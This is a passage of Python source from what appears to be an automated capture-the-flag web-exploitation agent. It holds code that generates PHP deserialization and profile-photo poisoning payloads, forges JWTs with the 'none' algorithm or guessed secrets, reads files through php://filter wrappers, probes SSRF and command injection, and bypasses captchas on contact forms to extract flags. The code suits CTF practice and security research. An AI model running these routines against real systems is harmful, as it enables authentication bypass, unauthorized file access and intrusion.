            for item in (page_features.get("endpoints") or [])
            if str(item).strip()
        )
        route_candidates.update(
            str(item).strip()
            for item in (page_features.get("raw_links") or [])
            if str(item).strip()
        )
        route_candidates.update(self._recent_local_source_hint_routes())

        protected_tokens = ("/api/admin", "/dashboard", "/admin", "/flag", "/profile")
        for route in route_candidates:
            lowered = route.lower()
            if any(token in lowered for token in protected_tokens):
                _add(urljoin(base.rstrip("/") + "/", route.lstrip("/")))

        _add(base)
        return candidates

    def _recent_observed_php_unserialize_source_exploit(
        self,
        *,
        limit: int = 8,
    ) -> dict[str, Any] | None:
        if self.state is None:
            return None
        for observation in reversed(
            self.state.recent_observations(
                "source_leak_exploit_candidate",
                limit=limit,
            )
        ):
            if str(getattr(observation, "value", "") or "").strip() != "php_unserialize":
                continue
            metadata = getattr(observation, "metadata", None)
            if not isinstance(metadata, dict):
                continue
            exploit_info = metadata.get("exploit_info") or {}
            if not isinstance(exploit_info, dict) or not exploit_info:
                continue
            artifact_url = str(metadata.get("artifact_url") or "").strip()
            return {
                "exploit_info": exploit_info,
                "artifact_url": artifact_url or "source_leak_observation",
            }
        return None

    def _recent_observed_profile_photo_poisoning_exploit(
        self,
        *,
        limit: int = 8,
    ) -> dict[str, Any] | None:
        if self.state is None:
            return None
        for observation in reversed(
            self.state.recent_observations(
                "source_leak_exploit_candidate",
                limit=limit,
            )
        ):
            if str(getattr(observation, "value", "") or "").strip() != "profile_photo_poisoning":
                continue
            metadata = getattr(observation, "metadata", None)
            if not isinstance(metadata, dict):
                continue
            exploit_info = metadata.get("exploit_info") or {}
            if not isinstance(exploit_info, dict) or not exploit_info:
                continue
            artifact_url = str(metadata.get("artifact_url") or "").strip()
            return {
                "exploit_info": exploit_info,
                "artifact_url": artifact_url or "source_leak_observation",
            }
        return None

    def _recent_observed_source_fetch_write_exploit(
        self,
        *,
        limit: int = 8,
    ) -> dict[str, Any] | None:
        if self.state is None:
            return None
        for observation in reversed(
            self.state.recent_observations(
                "source_leak_exploit_candidate",
                limit=limit,
            )
        ):
            if str(getattr(observation, "value", "") or "").strip() != "source_fetch_write_ssrf":
                continue
            metadata = getattr(observation, "metadata", None)
            if not isinstance(metadata, dict):
                continue
            exploit_info = metadata.get("exploit_info") or {}
            if not isinstance(exploit_info, dict) or not exploit_info:
                continue
            artifact_url = str(metadata.get("artifact_url") or "").strip()
            return {
                "exploit_info": exploit_info,
                "artifact_url": artifact_url or "source_leak_observation",
            }
        return None

    def _recent_local_profile_photo_poisoning_source_exploit(
        self,
        *,
        limit: int = 6,
    ) -> dict[str, Any] | None:
        if self.state is None:
            return None
        observations = [
            observation
            for observation in list(self.state.observations)[-max(1, limit):]
            if str(getattr(observation, "kind", "") or "").strip() == "local_challenge_source_hint"
        ]
        if not observations:
            return None
        joined = "\n".join(str(getattr(observation, "value", "") or "") for observation in observations)
        lowered = joined.lower()
        if (
            "serialize($profile)" not in lowered
            or "file_get_contents($profile['photo'])" not in lowered
            or "photo" not in lowered
        ):
            return None

        path_map = {
            "login_path": "/index.php",
            "register_path": "/register.php",
            "update_path": "/update.php",
            "profile_path": "/profile.php",
        }
        for line in joined.splitlines():
            stripped = str(line or "").strip()
            lowered_line = stripped.lower()
            for key, default_path in tuple(path_map.items()):
                file_name = default_path.lstrip("/").lower()
                if lowered_line.startswith(file_name + ":") or lowered_line.startswith(file_name + " "):
                    path_map[key] = default_path

        metadata = getattr(observations[-1], "metadata", None)
        artifact_url = ""
        if isinstance(metadata, dict):
            artifact_url = str(metadata.get("path") or metadata.get("file_name") or "").strip()
        poison_target = "config.php"
        payload_suffix = '";}s:5:"photo";s:10:"config.php";}'
        return {
            "exploit_info": {
                "type": "profile_photo_poisoning",
                "login_path": path_map["login_path"],
                "register_path": path_map["register_path"],
                "update_path": path_map["update_path"],
                "profile_path": path_map["profile_path"],
                "username_field": "username",
                "password_field": "password",
                "phone_field": "phone",
                "email_field": "email",
                "nickname_field": "nickname[]",
                "upload_field": "photo",
                "padding_token": "where",
                "padding_repeats": 34,
                "payload_suffix": payload_suffix,
                "poison_target": poison_target,
                "valid_phone": "13333333333",
                "valid_email": "a@a.a",
                "upload_filename": "avatar.txt",
                "upload_content": "HELLOPIA",
            },
            "artifact_url": artifact_url or "local_source_hint",
        }

    def _recent_local_php_unserialize_source_exploit(
        self,
        *,
        limit: int = 6,
    ) -> dict[str, Any] | None:
        if self.state is None:
            return None
        observations = [
            observation
            for observation in list(self.state.observations)[-max(1, limit):]
            if str(getattr(observation, "kind", "") or "").strip() == "local_challenge_source_hint"
        ]
        if not observations:
            return None
        joined = "\n".join(str(getattr(observation, "value", "") or "") for observation in observations)
        lowered = joined.lower()
        if "unserialize" not in lowered or "__destruct" not in lowered:
            return None
        class_match = re.search(r'class\s+([A-Za-z_][A-Za-z0-9_]*)', joined)
        class_name = class_match.group(1) if class_match else None
        get_match = re.search(r"\$_GET\[['\"]([A-Za-z0-9_]+)['\"]\]", joined)
        param_name = get_match.group(1) if get_match else "select"
        props = set(re.findall(r'private\s+\$([A-Za-z_][A-Za-z0-9_]*)', joined))
        if not class_name or "username" not in props or "password" not in props:
            return None

        payloads: list[str] = []
        for declared_count in (3, 4):
            payloads.append(
                'O:{name_len}:"{class_name}":{declared_count}:{{'
                's:{user_key_len}:"\x00{class_name}\x00username";s:5:"admin";'
                's:{pass_key_len}:"\x00{class_name}\x00password";i:100;}}'.format(
                    name_len=len(class_name),
                    class_name=class_name,
                    declared_count=declared_count,
                    user_key_len=len(class_name) + len("username") + 2,
                    pass_key_len=len(class_name) + len("password") + 2,
                )
            )

        metadata = getattr(observations[-1], "metadata", None)
        artifact_url = ""
        if isinstance(metadata, dict):
            artifact_url = str(metadata.get("path") or metadata.get("file_name") or "").strip()
        return {
            "exploit_info": {
                "type": "php_unserialize",
                "param": param_name,
                "class_name": class_name,
                "payloads": payloads,
            },
            "artifact_url": artifact_url or "local_source_hint",
        }

    def _recent_php_unserialize_source_exploit(
        self,
        *,
        limit: int = 8,
    ) -> dict[str, Any] | None:
        return self._recent_observed_php_unserialize_source_exploit(limit=limit) or self._recent_local_php_unserialize_source_exploit(limit=max(1, min(limit, 6)))

    def _recent_profile_photo_poisoning_source_exploit(
        self,
        *,
        limit: int = 8,
    ) -> dict[str, Any] | None:
        return self._recent_observed_profile_photo_poisoning_exploit(limit=limit) or self._recent_local_profile_photo_poisoning_source_exploit(limit=max(1, min(limit, 6)))

    def _primary_capability_for_chain(self, chain_name: str) -> str | None:
        if chain_name == "web":
            source_hint_text = self._recent_local_source_hint_text().lower()
            if "index.php" in source_hint_text and "unserialize" in source_hint_text:
                return "php_deserialization_test"
            if any(
                token in source_hint_text
                for token in ("app.py", "@app.route", "/admin", "/login", "flask(")
            ):
                return "http_request_basic"
        mapping = {
            "sqli": "sql_injection_test",
            "xss": "callback_listener",
            "web": "source_download",
            "jwt": "jwt_testing",
            "lfi": "http_request_basic",
            "cmdi": "http_request_basic",
            "ssrf": "http_request_basic",
            "upload": "http_request_basic",
        }
        return mapping.get(chain_name)

    # Web-framework signatures: (name, cookie markers, header markers, body markers).
    # Recon fingerprints the framework so the agent recognises e.g. a Laravel app
    # from its laravel_session cookie instead of treating it as a blank web target.
    _FRAMEWORK_SIGNATURES = (
        ("laravel", ("laravel_session",), (), ()),
        ("thinkphp", ("think_lang", "thinkphp"), (), ("thinkphp", "think\\app")),
        ("django", ("csrftoken", "sessionid"), (), ("csrfmiddlewaretoken",)),
        ("wordpress", ("wordpress_", "wp-settings"), (), ("wp-content", "wp-includes")),
        ("rails", ("_session_id",), (), ()),
        ("express", ("connect.sid",), ("express",), ()),
        ("spring", ("jsessionid",), (), ()),
        ("flask", (), ("werkzeug",), ()),
    )

    # Conventional high-value entry routes per framework. Seeded into the
    # exploration agenda whenever the framework is fingerprinted, so recon stays
    # robust even when the landing page links nothing scrapable (SPA, a
    # redirect-to-login, or a transient empty/booting body). The cookies/headers
    # that drive _fingerprint_framework arrive reliably even when the body does
    # not, so keying route seeding off the fingerprint keeps the agent on the
    # app's real entry points instead of degrading to blind backup/dotfile
    # guessing.
    _FRAMEWORK_CONVENTIONAL_ROUTES: dict[str, tuple[str, ...]] = {
        "laravel": ("/login", "/register", "/home", "/api"),
        "thinkphp": ("/index.php", "/admin", "/public"),
        "django": ("/admin/", "/login", "/api"),
        "wordpress": ("/wp-login.php", "/wp-admin/", "/wp-json"),
        "rails": ("/login", "/users/sign_in"),
        "express": ("/login", "/api", "/admin"),
        "spring": ("/login", "/actuator", "/swagger-ui.html"),
        "flask": ("/login", "/admin"),
    }

    def _fingerprint_framework(self, features: dict[str, Any]) -> str | None:
        """Record a ``framework_detected`` observation from recon signals.

        Matches cookie names / response headers / body markers against known web
        frameworks (Laravel, ThinkPHP, Django, WordPress, …). Returns the detected
        framework name, or None. Idempotent per framework.
        """
        if self.state is None:
            return None
        cookies = str(features.get("cookies") or "").lower()
        headers = features.get("headers") if isinstance(features.get("headers"), dict) else {}
        header_blob = " ".join(f"{k}:{v}" for k, v in headers.items()).lower()
        body = f"{features.get('html', '')}\n{features.get('content', '')}".lower()
        for name, cookie_sigs, header_sigs, body_sigs in self._FRAMEWORK_SIGNATURES:
            cookie_hit = next((sig for sig in cookie_sigs if sig in cookies), None)
            header_hit = next((sig for sig in header_sigs if sig in header_blob), None)
            body_hit = next((sig for sig in body_sigs if sig in body), None)
            evidence = cookie_hit or header_hit or body_hit
            if not evidence:
                continue
            already = any(
                str(getattr(o, "kind", "")) == "framework_detected"
                and str(getattr(o, "value", "")) == name
                for o in self.state.observations
            )
            if not already:
                self.state.add_observation(
                    "framework_detected",
                    name,
                    source="phase_recon",
                    metadata={
                        "evidence": str(evidence),
                        "signal": "cookie" if cookie_hit else ("header" if header_hit else "body"),
                    },
                )
            return name
        return None

    async def _proxy_get_with_retry(
        self,
        url: str,
        *,
        attempts: int = 3,
        timeout: int = 10,
        audit_target: str = "",
        audit_metadata: dict[str, Any] | None = None,
    ) -> dict[str, Any]:
        """GET via proxy_action, retrying transient boot/unavailable responses.

        CTF target instances are frequently mid-boot for the first seconds and
        return 5xx ("Target unavailable") or a tiny placeholder body. Accepting
        that as the page leaves recon with no links/forms → empty agenda → the
        agent gives up. Retry a few times with a short backoff and return the
        first usable response (2xx/3xx/4xx with a non-trivial body); otherwise the
        last response seen.
        """
        last: dict[str, Any] = {}
        for attempt in range(max(1, attempts)):
            page = await self._runtime_proxy_action(
                "get",
                url=url,
                timeout=timeout,
                audit_target=audit_target or url,
                audit_metadata=audit_metadata,
            )
            last = page if isinstance(page, dict) else {}
            if isinstance(page, dict) and not page.get("error"):
                status = int(page.get("status_code") or 0)
                body = str(page.get("body") or "")
                if status and status < 500 and len(body) >= 200:
                    return page
            if attempt < attempts - 1:
                await asyncio.sleep(1.5 * (attempt + 1))
        return last

    @staticmethod
    def _is_legacy_browser_runtime_probe(probe: Any) -> bool:
        if not isinstance(probe, dict):
            return False
        error = str(probe.get("error") or "").strip().lower()
        if not error:
            return False
        return "unexpected action: diagnose" in error or "unexpected browser action: diagnose" in error

    async def _execute_chain(
        self,
        *,
        chain_name: str,
        target: str,
        page_features: dict[str, Any],
        hint: str,
    ) -> _ChainOutcome:
        chain_handlers = self._chain_handler_map(
            target=target,
            page_features=page_features,
            hint=hint,
        )
        handler = chain_handlers.get(chain_name, self._default_chain_handler(target=target))
        outcome = await handler()

        if (
            not outcome.flag
            and not outcome.progress
            and self.llm is not None
            and self.state is not None
            and self.state.is_llm_exploration_allowed()
        ):
            fallback = await self._run_llm_driven_exploration(
                self._strategy_context(
                    target=target,
                    page_features=page_features,
                    hint=hint,
                    extras={"chain_name": chain_name},
                )
            )
            if fallback.progress or fallback.flag:
                return fallback
        return outcome

    def _chain_handler_map(
        self,
        *,
        target: str,
        page_features: dict[str, Any],
        hint: str,
    ) -> dict[str, Callable[[], Awaitable[_ChainOutcome]]]:
        return {
            "xss": lambda: self._execute_xss_route(target, page_features, hint),
            "web": lambda: self._execute_web_route(target, page_features, hint),
            "misc": lambda: self._execute_misc_chain(target, page_features, hint),
            "sqli": lambda: self._execute_sqli_chain(target, page_features, hint),
            "jwt": lambda: self._execute_jwt_chain(target, page_features),
            "lfi": lambda: self._execute_lfi_chain(target),
            "cmdi": lambda: self._attempt_generic_param_cmdi(target, page_features),
            "ssrf": lambda: self._attempt_generic_param_ssrf(target, page_features),
            "upload": lambda: self._execute_upload_chain(target, page_features, hint),
        }

    def _default_chain_handler(
        self,
        *,
        target: str,
    ) -> Callable[[], Awaitable[_ChainOutcome]]:
        return lambda: self._execute_terminal_commands(
            target,
            [
                f'curl -s "{target}"',
                f'curl -s "{urljoin(target if target.endswith("/") else target + "/", "robots.txt")}"',
            ],
        )

    async def _run_jwt_manipulation_strategy(
        self,
        target: str,
        page_features: dict[str, Any],
    ) -> _ChainOutcome:
        self.tool_guard.require(["http_request"])
        base = _base_target(target)
        candidates = self._collect_candidate_jwts(target, page_features)
        if not candidates:
            return _ChainOutcome(progress=False, reason="jwt_manipulation: no candidate token found")

        progress = False
        reasons: list[str] = []
        target_candidates = self._jwt_target_candidates(base, page_features)
        for candidate in candidates:
            token = str(candidate.get("token") or "").strip()
            if not token:
                continue
            try:
                header = _jwt_get_unverified_header(token)
                payload = _jwt_decode_payload(token)
            except Exception:
                continue

            mutated_payloads = self._jwt_mutation_candidates(payload)
            algorithm_order = self._jwt_algorithm_candidates(header)
            secrets = self._jwt_secret_candidates()
            for payload_variant in mutated_payloads:
                for algorithm in algorithm_order:
                    signed_variants: list[str] = []
                    if algorithm == "none":
                        signed_variants.append(self._encode_none_jwt(payload_variant))
                    else:
                        for secret in secrets:
                            try:
                                signed_variants.append(
                                    _jwt_encode(payload_variant, secret, algorithm)
                                )
                            except Exception:
                                continue
                    for mutated_token in signed_variants:
                        for headers in self._jwt_request_headers(candidate, mutated_token):
                            for request_target in target_candidates:
                                try:
                                    resp = await self.runtime.proxy_action(
                                        "get",
                                        url=request_target,
                                        headers=headers,
                                        timeout=10,
                                    )
                                except Exception:
                                    continue
                                if not isinstance(resp, dict) or resp.get("error"):
                                    continue
                                status = int(resp.get("status_code") or 0)
                                body = str(resp.get("body") or "")
                                progress = progress or status in {200, 302}
                                if self.state is not None:
                                    self.state.add_observation(
                                        "jwt_probe_response",
                                        body[:300],
                                        source="jwt_manipulation",
                                        metadata={
                                            "algorithm": algorithm,
                                            "status_code": status,
                                            "url": request_target,
                                            "header_keys": sorted(headers.keys()),
                                            "payload_keys": sorted(payload_variant.keys()),
                                        },
                                    )
                                if body:
                                    await self._scan_and_store(body, request_target, evidence_source="response_body")
                                flag = self._extract_flag(body)
                                if flag:
                                    verification = await self._observe_flag(
                                        flag,
                                        request_target,
                                        evidence_source="response_body",
                                        rationale=f"jwt_manipulation via {algorithm}",
                                    )
                                    if verification.decision in {"verified", "runtime"}:
                                        return _ChainOutcome(
                                            progress=True,
                                            flag=verification.flag,
                                            reason=f"jwt_manipulation flag via {algorithm}",
                                        )
                                if status in {200, 302}:
                                    reasons.append(f"jwt {algorithm} changed status to {status} at {request_target}")
        return _ChainOutcome(progress=progress, reason="; ".join(dict.fromkeys(reasons[:4])) or "jwt_manipulation exhausted")

    async def _run_hint_chain_followup_strategy(
        self,
        target: str,
        page_features: dict[str, Any],
    ) -> _ChainOutcome:
        """
        Input:  target URL + page_features（含 raw_links / endpoints）
        Output: _ChainOutcome；副作用：将提示文件内容写入 state.observations
        Success: 从提示文件发现 flag 或关键规则（hash 算法等）
        Failure: 提示文件均 404 或空；上层 web 链继续下一策略
        """
        self.tool_guard.require(["http_request"])
        base = _base_target(target)
        # 构造候选提示文件列表（从 raw_links / endpoints / 固定路径）
        hint_paths: list[str] = ["/hints.txt", "/welcome.txt", "/flag.txt"]
        for path in list(page_features.get("endpoints") or []):
            if any(t in path.lower() for t in ("/hint", "/welcome", "/flag.txt")):
                if path not in hint_paths:
                    hint_paths.append(path)
        # raw_links 中带完整路径的提示文件
        for raw in page_features.get("raw_links") or []:
            parsed_path = urlparse(raw).path
            if any(t in parsed_path.lower() for t in ("/hints.txt", "/welcome.txt", "/flag.txt")):
                if parsed_path not in hint_paths:
                    hint_paths.append(parsed_path)

        progress = False
        reasons: list[str] = []

        for path in hint_paths:
            url = urljoin(base + "/", path.lstrip("/"))
            try:
                resp = await self.runtime.proxy_action("get", url=url, timeout=10)
            except Exception:
                continue
            if not isinstance(resp, dict) or resp.get("error"):
                continue
            status = int(resp.get("status_code") or 0)
            body = str(resp.get("body") or "")
            if status == 200 and body:
                progress = True
                reasons.append(f"{path}: {body[:120].strip()}")
                if self.state is not None:
                    self.state.add_observation(
                        "hint_file_content",
                        body,
                        source="hint_chain_followup",
                        metadata={"url": url, "path": path, "status_code": status},
                    )
                    # 标记 agenda 中对应条目为已探索
                    for item in self.state.exploration_agenda:
                        if item.url_or_path in (path, url):
                            item.explored = True
                            item.exploration_result = f"status=200 body_len={len(body)}"
                # 检查是否直接包含 flag
                flag = self._extract_flag(body)
                if flag:
                    verification = await self._observe_flag(
                        flag, base,
                        evidence_source="response_body",
                        rationale=f"hint file: {path}",
                    )
                    if verification.decision in {"verified", "runtime"}:
                        return _ChainOutcome(
                            progress=True,
                            flag=verification.flag,
                            reason=f"hint file flag: {path}",
                        )
                await self._scan_and_store(
                    body,
                    url,
                    evidence_source="response_body",
                    page_features=page_features,
                )

        return _ChainOutcome(progress=progress, reason="; ".join(reasons[:3]))

    async def _run_file_read_endpoint_strategy(
        self,
        target: str,
        page_features: dict[str, Any],
    ) -> _ChainOutcome:
        """
        Input:  target URL + page_features
        Output: _ChainOutcome；副作用：写入 observations
        Success: 响应包含 flag 或错误信息暗示 hash 规则
        Failure: 所有 URL 均无有用响应；上层继续
        """
        self.tool_guard.require(["http_request"])
        base = _base_target(target)
        raw_links = list(page_features.get("raw_links") or [])
        # 带 file/path/filename 等参数的完整 URL 优先
        file_urls: list[str] = [
            u
            for u in raw_links
            if any(token in u.lower() for token in ("filename=", "?file=", "&file=", "?path=", "&path=", "?page=", "&page=", "?include=", "&include="))
        ]
        # 尝试直接 GET（不带正确 hash）触发错误信息
        for filename in ("/flag.txt", "/hints.txt", "/welcome.txt"):
            probe = urljoin(base + "/", f"file?filename={filename}")
            if probe not in file_urls:
                file_urls.append(probe)

        # 对二级提示里挖出的 ?file=flag.php 一类面，继续尝试 php://filter 读取源码
        for candidate in list(file_urls):
            for wrapper_url in self._build_file_wrapper_urls(candidate):
                if wrapper_url not in file_urls:
                    file_urls.append(wrapper_url)

        progress = False
        reasons: list[str] = []

        for url in file_urls[:12]:
            try:
                resp = await self.runtime.proxy_action("get", url=url, timeout=10)
            except Exception:
                continue
            if not isinstance(resp, dict) or resp.get("error"):
                continue
            body = str(resp.get("body") or "")
            status = int(resp.get("status_code") or 0)
            final_url = str(resp.get("final_url") or url)
            redirect_history = list(resp.get("redirect_history") or [])
            if not body:
                continue
            progress = True
            reasons.append(f"file_read {urlparse(url).path}: status={status}")
            if self.state is not None:
                self.state.add_observation(
                    "file_read_response",
                    body[:500],
                    source="file_read_endpoint",
                    metadata={
                        "url": url,
                        "status_code": status,
                        "final_url": final_url,
                        "redirect_history": redirect_history,
                    },
                )
                if final_url != url or redirect_history:
                    self.state.add_observation(
                        "file_read_redirect",
                        final_url,
                        source="file_read_endpoint",
                        metadata={
                            "url": url,
                            "status_code": status,
                            "redirect_history": redirect_history,
                        },
                    )
            flag = self._extract_flag(body)
            if flag:
                verification = await self._observe_flag(
                    flag, base,
                    evidence_source="response_body",
                    rationale=f"file read: {url}",
                )
                if verification.decision in {"verified", "runtime"}:
                    return _ChainOutcome(progress=True, flag=verification.flag, reason="file read flag")
            await self._scan_and_store(
                body,
                final_url or url,
                evidence_source="response_body",
                page_features=page_features,
            )
            if decoded := self._decode_base64_source_blob(body):
                if self.state is not None:
                    self.state.add_observation(
                        "decoded_source_blob",
                        decoded[:1200],
                        source="file_read_endpoint",
                        metadata={
                            "url": final_url or url,
                            "decoded_from_base64": True,
                            "web_subtype": ["source_leak"],
                        },
                    )
                if decoded_flag := self._extract_flag(decoded):
                    verification = await self._observe_flag(
                        decoded_flag,
                        base,
                        evidence_source="response_body",
                        rationale=f"decoded runtime source leak: {final_url or url}",
                        evidence_url=final_url or url,
                        evidence_snippet=decoded[:240],
                        replayable=True,
                    )
                    if verification.decision in {"verified", "runtime"}:
                        return _ChainOutcome(
                            progress=True,
                            flag=verification.flag if verification.decision == "verified" else None,
                            reason="file read decoded source flag",
                        )
                await self._scan_and_store(
                    decoded,
                    final_url or url,
                    evidence_source="source-leak",
                    page_features=page_features,
                )

        return _ChainOutcome(progress=progress, reason="; ".join(reasons[:3]))

    async def _run_contact_report_chain_strategy(
        self,
        target: str,
        page_features: dict[str, Any],
    ) -> _ChainOutcome:
        """
        Input:  target URL + page_features（含登录后 raw_links / forms）
        Output: _ChainOutcome；副作用：写入 observations / blocked surface
        Success: 至少进入 /contact 并完成一次真实提交，或确认 report 已提交
        Failure: 被 captcha/pow 阻塞时记录统一失败回显，供 recovery/reasoning 反证降权
        """
        self.tool_guard.require(["http_request"])
        base = _base_target(target)
        strategy_kind = "contact_report_chain"
        if self._has_prior_contact_report_submission():
            return _ChainOutcome(progress=False, reason="contact/report already submitted")

        candidate_urls: list[str] = []
        seen: set[str] = set()
        seeded_candidates = ["/contact", "contact", "/report", "report"]
        explicit_contact_links = [
            str(raw or "").strip()
            for raw in (page_features.get("raw_links") or [])
            if any(token in str(raw or "").lower() for token in ("/contact", "/report"))
        ]
        for raw in [*seeded_candidates, *explicit_contact_links]:
            text = str(raw or "").strip()
            if not text:
                continue
            absolute = text if text.startswith(("http://", "https://")) else urljoin(base + "/", text.lstrip("/"))
            if absolute in seen:
                continue
            seen.add(absolute)
            candidate_urls.append(absolute)

        contact_url = ""
        contact_form: dict[str, Any] | None = None
        contact_body = ""
        contact_status = 0

        for url in candidate_urls:
            try:
                resp = await self.runtime.proxy_action("get", url=url, timeout=12)
            except Exception:
                continue
            if not isinstance(resp, dict) or resp.get("error"):
                continue
            body = str(resp.get("body") or "")
            status = int(resp.get("status_code") or 0)
            final_url = str(resp.get("final_url") or url).strip() or url
            if status != 200 or not body:
                continue
            lowered = body.lower()
            final_path = urlparse(final_url).path.lower()
            forms = _parse_forms_from_html(body, final_url)
            strong_contact_signal = (
                "/contact" in final_path
                or "/report" in final_path
                or any(
                    token in lowered
                    for token in (
                        "/static/pow.py",
                        "/static/vpow.py",
                        "captcha",
                        "contact admin",
                        "admin defaultly only sees",
                        "proof of work",
                    )
                )
            )
            if strong_contact_signal:
                contact_url = final_url
                contact_body = body
                contact_status = status
                contact_form = forms[0] if forms else None
                break

        if not contact_url or not contact_body:
            return _ChainOutcome(progress=False, reason="contact page not discovered")

        await self._scan_and_store(
            contact_body,
            contact_url,
            evidence_source="response_body",
            page_features=page_features,
        )
        if self.state is not None:
            self.state.add_observation(
                "contact_surface",
                contact_url,
                source=strategy_kind,
                metadata={
                    "status_code": contact_status,
                    "has_form": bool(contact_form),
                    "candidate_urls": list(candidate_urls),
                },
            )

        if contact_form is None:
            if self.state is not None:
                await self._record_uniform_failure_surface(
                    "contact page missing actionable form",
                    source=strategy_kind,
                    metadata={
                        "strategy_kind": strategy_kind,
                        "reason": "contact page discovered but no actionable form parsed",
                        "contact_url": contact_url,
                    },
                )
            return _ChainOutcome(progress=True, reason="contact page found but no actionable form")

        submission: dict[str, str] = {}
        desc_field = ""
        url_field = ""
        captcha_fields: list[str] = []
        captcha_answer_fields: list[str] = []
        pow_fields: list[str] = []

        for inp in contact_form.get("inputs") or []:
            if not isinstance(inp, dict):
                continue
            name = str(inp.get("name") or "").strip()
            if not name:
                continue
            field_type = str(inp.get("type") or "text").strip().lower()
            value = str(inp.get("value") or "")
            lowered_name = name.lower()

            if field_type in {"submit", "button", "image", "reset", "file"}:
                continue
            if field_type == "hidden":
                submission[name] = value
                if "captcha" in lowered_name:
                    captcha_fields.append(name)
                continue

            if any(token in lowered_name for token in ("desc", "message", "content", "text")) and not desc_field:
                desc_field = name
                submission[name] = "ctf probe report"
                continue
            if lowered_name == "url" or lowered_name.endswith("url"):
                url_field = name
                submission[name] = base + "/"
                continue
            if "captcha" in lowered_name:
                captcha_fields.append(name)
                captcha_answer_fields.append(name)
                submission[name] = value
                continue
            if "pow" in lowered_name:
                pow_fields.append(name)
                submission[name] = value
                continue
            submission[name] = value

        if self.state is not None:
            self.state.add_observation(
                "contact_form_detected",
                contact_url,
                source=strategy_kind,
                metadata={
                    "fields": sorted(submission.keys()),
                    "desc_field": desc_field,
                    "url_field": url_field,
                    "captcha_fields": sorted(captcha_fields),
                    "captcha_answer_fields": sorted(captcha_answer_fields),
                    "pow_fields": sorted(pow_fields),
                },
            )

        captcha_solution = await _solve_contact_captcha_solution(
            self.runtime,
            contact_body,
            contact_url,
        )
        if captcha_solution is not None and captcha_answer_fields:
            for field_name in captcha_answer_fields:
                submission[field_name] = str(captcha_solution)
            if self.state is not None:
                self.state.add_observation(
                    "contact_captcha_solved",
                    str(captcha_solution),
                    source=strategy_kind,
                    metadata={
                        "contact_url": contact_url,
                        "fields": sorted(captcha_answer_fields),
                        "preserved_fields": sorted(
                            field_name for field_name in captcha_fields if field_name not in captcha_answer_fields
                        ),
                    },
                )

        pow_challenge_match = _CONTACT_POW_CHALLENGE_RE.search(contact_body)
        if pow_challenge_match and pow_fields:
            pow_solution = _solve_contact_pow_solution(pow_challenge_match.group(1))
            if pow_solution is not None:
                for field_name in pow_fields:
                    submission[field_name] = str(pow_solution)
                if self.state is not None:
                    self.state.add_observation(
                        "contact_pow_solved",
                        str(pow_solution),
                        source=strategy_kind,
                        metadata={
                            "contact_url": contact_url,
                            "challenge": pow_challenge_match.group(1),
                            "fields": sorted(pow_fields),
                        },
                    )

        response, request_url = await self._submit_form_request(contact_url, contact_form, submission)
        body = str((response or {}).get("body") or "")
        status = int((response or {}).get("status_code") or 0)
        final_url = str((response or {}).get("final_url") or request_url or contact_url).strip() or contact_url
        await self._scan_and_store(body, final_url, evidence_source="http-response")

        lowered_body = body.lower()
        invalid_captcha = "invalid captcha" in lowered_body
        pow_required = (
            "pow" in lowered_body
            and any(token in lowered_body for token in ("invalid", "required", "missing", "wrong"))
        )
        submitted_signal = self._is_contact_submission_success(
            response=response,
            body=body,
            final_url=final_url,
        )

        if invalid_captcha and captcha_answer_fields:
            brute_force_result = await self._attempt_contact_captcha_bypass(
                contact_url=contact_url,
                contact_form=contact_form,
                submission=submission,
                captcha_fields=captcha_answer_fields,
                strategy_kind=strategy_kind,
            )
            if brute_force_result is not None:
                response, request_url, bypass_value = brute_force_result
                body = str((response or {}).get("body") or "")
                status = int((response or {}).get("status_code") or 0)
                final_url = str((response or {}).get("final_url") or request_url or contact_url).strip() or contact_url
                await self._scan_and_store(body, final_url, evidence_source="http-response")
                lowered_body = body.lower()
                invalid_captcha = "invalid captcha" in lowered_body
                pow_required = (
                    "pow" in lowered_body
                    and any(token in lowered_body for token in ("invalid", "required", "missing", "wrong"))
                )
                submitted_signal = self._is_contact_submission_success(
                    response=response,
                    body=body,
                    final_url=final_url,
                )
                if self.state is not None:
                    self.state.add_observation(
                        "contact_captcha_bypass",
                        str(bypass_value),
                        source=strategy_kind,
                        metadata={
                            "contact_url": contact_url,
                            "request_url": request_url,
                            "status_code": status,
                            "fields": sorted(captcha_fields),
                        },
                    )

        blocker_reasons: list[str] = []
        if invalid_captcha:
            blocker_reasons.append("invalid captcha")
        if pow_required:
            blocker_reasons.append("pow required")
        if (captcha_fields or pow_fields) and not submitted_signal and not blocker_reasons:
            blocker_reasons.append("captcha/pow gated form")

        if blocker_reasons:
            blocker_reason = ", ".join(blocker_reasons)
            await self._store_note(
                key="ctf_contact_blocker",
                value=f"{contact_url} blocked by {blocker_reason}",
                category="finding",
                target=urlparse(base).netloc or base,
                url=contact_url,
            )
            if self.state is not None:
                await self._record_uniform_failure_surface(
                    blocker_reason,
                    source=strategy_kind,
                    metadata={
                        "strategy_kind": strategy_kind,
                        "reason": blocker_reason,
                        "contact_url": contact_url,
                        "request_url": request_url,
                        "status_code": status,
                        "captcha_fields": sorted(captcha_fields),
                        "pow_fields": sorted(pow_fields),
                    },
                )
            return _ChainOutcome(progress=True, reason=f"contact blocked: {blocker_reason}")

        if submitted_signal:
            await self._store_note(
                key="ctf_contact_submission",
                value=f"submitted contact/report form at {contact_url}",
                category="finding",
                target=urlparse(base).netloc or base,
                url=contact_url,
            )
            if self.state is not None:
                self.state.add_observation(
                    "contact_report_submitted",
                    contact_url,
                    source=strategy_kind,
                    metadata={
                        "request_url": request_url,
                        "status_code": status,
                        "final_url": final_url,
                    },
                )
            return _ChainOutcome(progress=True, reason="contact/report form submitted")

        return _ChainOutcome(progress=True, reason=f"contact form attempted: status={status}")

    def _has_prior_contact_report_submission(self) -> bool:
        state = getattr(self, "state", None)
        for observation in list(getattr(state, "observations", []) or []):
            if str(getattr(observation, "kind", "") or "").strip() != "contact_report_submitted":
                continue
            metadata = getattr(observation, "metadata", None)
            if not isinstance(metadata, dict):
                return True
            if str(metadata.get("status_code") or "").strip():
                return True
        return False

    def _is_contact_submission_success(
        self,
        *,
        response: dict[str, Any] | None,
        body: str,
        final_url: str,
    ) -> bool:
        lowered_body = str(body or "").lower()
        if any(
            token in lowered_body
            for token in ("thank", "queued", "reported", "sent", "submitted", "admin will")
        ):
            return True

        headers = (response or {}).get("headers") or {}
        if str(headers.get("location") or "").strip():
            return True

        final_path = urlparse(str(final_url or "")).path.lower()
        if final_path.endswith("/urlstorage"):
            if any(
                token in lowered_body
                for token in ("store your url", "get flag", "save changes", "logout")
            ):
                return True
        return False

    async def _attempt_contact_captcha_bypass(
        self,
        *,
